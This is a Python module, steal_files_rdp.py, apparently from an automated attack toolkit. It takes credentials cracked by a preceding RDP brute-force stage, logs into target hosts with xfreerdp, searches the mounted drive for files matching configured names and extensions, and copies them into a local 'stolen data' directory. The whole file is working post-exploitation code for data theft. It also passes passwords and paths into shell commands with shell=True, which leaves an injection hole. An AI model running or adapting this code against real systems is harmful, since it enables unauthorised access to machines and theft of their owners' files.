"""
steal_files_rdp.py - This script connects to remote RDP servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import subprocess
import logging
import time
from threading import Timer
from rich.console import Console
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="steal_files_rdp.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesRDP"
b_module = "steal_files_rdp"
b_status = "steal_files_rdp"
b_parent = "RDPBruteforce"
b_port = 3389

class StealFilesRDP:
    """
    Class to handle the process of stealing files from RDP servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.rdp_connected = False
            self.stop_execution = False
            logger.info("StealFilesRDP initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_rdp(self, ip, username, password):
        """
        Establish an RDP connection.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("RDP connection attempt interrupted due to orchestrator exit.")
                return None
            command = f"xfreerdp /v:{ip} /u:{username} /p:{password} /drive:shared,/mnt/shared"
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                logger.info(f"Connected to {ip} via RDP with username {username}")
                self.rdp_connected = True
                return process
            else:
                logger.error(f"Error connecting to RDP on {ip} with username {username}: {stderr.decode()}")
                return None
        except Exception as e:
            logger.error(f"Error connecting to RDP on {ip} with username {username}: {e}")
            return None

    def find_files(self, client, dir_path):
        """
        Find files in the remote directory based on the configuration criteria.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted due to orchestrator exit.")
                return []
            # Assuming that files are mounted and can be accessed via SMB or locally
            files = []
            for root, dirs, filenames in os.walk(dir_path):
                for file in filenames:
                    if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                       any(file_name in file for file_name in self.shared_data.steal_file_names):
                        files.append(os.path.join(root, file))
            logger.info(f"Found {len(files)} matching files in {dir_path}")
            return files
        except Exception as e:
            logger.error(f"Error finding files in directory {dir_path}: {e}")
            return []

    def steal_file(self, remote_file, local_dir):
        """
        Download a file from the remote server to the local directory.
        """
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File stealing process interrupted due to orchestrator exit.")
                return
            local_file_path = os.path.join(local_dir, os.path.basename(remote_file))
            os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
            command = f"cp {remote_file} {local_file_path}"
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
            else:
                logger.error(f"Error downloading file {remote_file}: {stderr.decode()}")
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using RDP.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesRDP"
                # Wait a bit because it's too fast to see the status change
                time.sleep(5)
                logger.info(f"Stealing files from {ip}:{port}...")

                # Get RDP credentials from the cracked passwords file
                rdpfile = self.shared_data.rdpfile
                credentials = []
                if os.path.exists(rdpfile):
                    with open(rdpfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                def timeout():
                    """
                    Timeout function to stop the execution if no RDP connection is established.
                    """
                    if not self.rdp_connected:
                        logger.error(f"No RDP connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)  # 4 minutes timeout
                timer.start()

                # Attempt to steal files using each credential
                success = False
                for username, password in credentials:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        logger.info("Steal files execution interrupted due to orchestrator exit.")
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for {ip}")
                        client = self.connect_rdp(ip, username, password)
                        if client:
                            remote_files = self.find_files(client, '/mnt/shared')
                            mac = row['MAC Address']
                            local_dir = os.path.join(self.shared_data.datastolendir, f"rdp/{mac}_{ip}")
                            if remote_files:
                                for remote_file in remote_files:
                                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                        logger.info("File stealing process interrupted due to orchestrator exit.")
                                        break
                                    self.steal_file(remote_file, local_dir)
                                success = True
                                countfiles = len(remote_files)
                                logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
                            client.terminate()
                            if success:
                                timer.cancel()  # Cancel the timer if the operation is successful
                                return 'success'  # Return success if the operation is successful
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with username {username}: {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_rdp = StealFilesRDP(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
